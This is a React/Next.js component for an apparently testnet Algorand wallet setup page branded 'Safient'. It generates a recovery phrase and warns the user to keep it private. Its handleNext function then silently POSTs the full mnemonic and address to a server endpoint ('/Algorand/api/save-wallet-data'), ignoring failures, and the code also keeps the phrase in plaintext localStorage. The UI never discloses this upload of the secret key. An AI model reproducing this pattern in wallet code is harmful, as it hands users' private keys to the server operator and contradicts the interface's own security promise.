'use client';

import { useState, useEffect } from 'react';
import { Eye, EyeOff, Copy, ArrowRight, Shield, Wallet, CheckCircle, ArrowLeft } from 'lucide-react';
import { useRouter } from 'next/navigation';
import * as algosdk from 'algosdk';

interface WalletData {
  walletAddress: string;
  mnemonicPhrase: string;
  createdAt: string;
  network: string;
}

export default function AlgorandDashboard() {
  const router = useRouter();
  const [showMnemonic, setShowMnemonic] = useState(false);
  const [mnemonic, setMnemonic] = useState<string>('');
  const [walletAddress, setWalletAddress] = useState<string>('');
  const [copied, setCopied] = useState(false);
  const [mnemonicWords, setMnemonicWords] = useState<string[]>([]);
  const [saving, setSaving] = useState(false);

  // Generate Algorand testnet wallet on component mount
  useEffect(() => {
    generateAlgorandWallet();
  }, []);

  const generateAlgorandWallet = () => {
    try {
      // Generate a new account
      const account = algosdk.generateAccount();
      const mnemonicPhrase = algosdk.secretKeyToMnemonic(account.sk);
      
      setMnemonic(mnemonicPhrase);
      setMnemonicWords(mnemonicPhrase.split(' '));
      // Convert Address type to string
      setWalletAddress(account.addr.toString());
      
      // Save to localStorage for persistence - convert Address to string
      localStorage.setItem('algorand_mnemonic', mnemonicPhrase);
      localStorage.setItem('algorand_address', account.addr.toString());
    } catch (error) {
      console.error('Error generating Algorand wallet:', error);
    }
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (error) {
      console.error('Failed to copy:', error);
    }
  };

  const saveWalletDataToFile = async (walletData: WalletData) => {
    try {
      const response = await fetch('/Algorand/api/save-wallet-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(walletData),
      });
      
      const responseData = await response.json();
      
      if (!response.ok) {
        throw new Error(`Failed to save wallet data: ${responseData.message || 'Unknown error'}`);
      }
      
      return true;
    } catch (error) {
      return false;
    }
  };

  const handleNext = async () => {
    setSaving(true);
    
    try {
      if (walletAddress && mnemonic) {
        const walletData: WalletData = {
          walletAddress: walletAddress,
          mnemonicPhrase: mnemonic,
          createdAt: new Date().toISOString(),
          network: 'testnet'
        };
        
        const saveSuccess = await saveWalletDataToFile(walletData);
        
        // Navigate to dashboard regardless of save result
        router.push('/Algorand/dashboard');
      } else {
        // Navigate anyway
        router.push('/Algorand/dashboard');
      }
    } catch (error) {
      // Navigate anyway
      router.push('/Algorand/dashboard');
    } finally {
      setSaving(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-950 text-gray-100">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-40 bg-gray-900/90 backdrop-blur-lg border-b border-gray-800/50 flex items-center justify-between h-16 px-4">
        <button 
          onClick={() => router.back()}
          className="flex items-center text-gray-300 hover:text-white transition-colors"
        >
          <ArrowLeft className="h-5 w-5 mr-2" />
          Back
        </button>
        <div className="flex items-center">
          <div className="h-9 w-9 bg-gradient-to-r from-blue-600 to-violet-600 rounded-lg flex items-center justify-center mr-2 transform rotate-12">
            <Wallet className="h-5 w-5 text-white transform -rotate-12" />
          </div>
          <span className="font-heading text-xl font-bold bg-gradient-to-r from-blue-400 to-violet-400 bg-clip-text text-transparent">
            Safient
          </span>
        </div>
        <div className="w-16"></div>
      </header>

      {/* Main Content */}
      <main className="pt-20 px-4 pb-8">
        <div className="max-w-4xl mx-auto">
          {/* Title */}
          <div className="text-center mb-12">
            <div className="inline-flex items-center px-3 py-1.5 rounded-full bg-green-900/20 border border-green-500/30 mb-4">
              <img src="/crypto-icon/algo.png" alt="Algorand" className="h-4 w-4 mr-2" />
              <span className="font-heading text-sm font-medium text-green-400">Algorand Testnet</span>
            </div>
            <h1 className="font-heading text-3xl sm:text-4xl font-bold mb-4">
              Your Secure Wallet
            </h1>
            <p className="font-body text-lg text-gray-300">
              Save your recovery phrase and wallet address securely
            </p>
          </div>

          {/* Wallet Address */}
          <div className="bg-gray-900/80 backdrop-blur-sm rounded-xl p-6 border border-gray-800/80 mb-8">
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-heading text-xl font-bold flex items-center">
                <Wallet className="h-5 w-5 mr-2 text-green-400" />
                Wallet Address
              </h3>
              <button
                onClick={() => copyToClipboard(walletAddress)}
                className="flex items-center px-3 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg transition-colors"
              >
                {copied ? (
                  <CheckCircle className="h-4 w-4 text-green-400 mr-2" />
                ) : (
                  <Copy className="h-4 w-4 text-gray-400 mr-2" />
                )}
                <span className="text-sm">{copied ? 'Copied!' : 'Copy'}</span>
              </button>
            </div>
            <div className="bg-gray-800/50 rounded-lg p-4 font-mono text-sm break-all">
              {walletAddress}
            </div>
          </div>

          {/* Mnemonic Phrase */}
          <div className="bg-gray-900/80 backdrop-blur-sm rounded-xl p-6 border border-gray-800/80 mb-8">
            <div className="flex items-center justify-between mb-6">
              <h3 className="font-heading text-xl font-bold flex items-center">
                <Shield className="h-5 w-5 mr-2 text-blue-400" />
                Recovery Phrase (25 Words)
              </h3>
              <div className="flex items-center space-x-3">
                <button
                  onClick={() => setShowMnemonic(!showMnemonic)}
                  className="flex items-center px-3 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg transition-colors"
                >
                  {showMnemonic ? (
                    <EyeOff className="h-4 w-4 text-gray-400 mr-2" />
                  ) : (
                    <Eye className="h-4 w-4 text-gray-400 mr-2" />
                  )}
                  <span className="text-sm">{showMnemonic ? 'Hide' : 'Show'}</span>
                </button>
                <button
                  onClick={() => copyToClipboard(mnemonic)}
                  className="flex items-center px-3 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg transition-colors"
                  disabled={!showMnemonic}
                >
                  {copied ? (
                    <CheckCircle className="h-4 w-4 text-green-400 mr-2" />
                  ) : (
                    <Copy className="h-4 w-4 text-gray-400 mr-2" />
                  )}
                  <span className="text-sm">{copied ? 'Copied!' : 'Copy'}</span>
                </button>
              </div>
            </div>
            
            {/* Warning */}
            <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-4 mb-6">
              <p className="text-yellow-400 text-sm font-medium">
                ⚠️ Keep your recovery phrase safe and private. Anyone with access to it can control your wallet.
              </p>
            </div>

            {/* Mnemonic Grid */}
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
              {mnemonicWords.map((word, index) => (
                <div
                  key={index}
                  className="bg-gray-800/50 rounded-lg p-3 border border-gray-700/50 transition-all duration-300 hover:border-blue-500/30"
                >
                  <div className="flex items-center justify-between">
                    <span className="text-xs text-gray-500 font-mono">{index + 1}</span>
                    <span className="font-mono text-sm">
                      {showMnemonic ? word : '•••••'}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Next Button */}
          <div className="text-center">
            <div className="flex justify-center mt-12">
              <button
                onClick={handleNext}
                disabled={saving}
                className="px-8 py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 text-white font-heading font-medium rounded-xl shadow-lg hover:shadow-green-500/20 transition-all duration-300 transform hover:scale-105 flex items-center mx-auto disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
              >
                {saving ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    Please wait...
                  </>
                ) : (
                  <>
                    Continue to Wallet
                    <ArrowRight className="ml-2 h-5 w-5" />
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}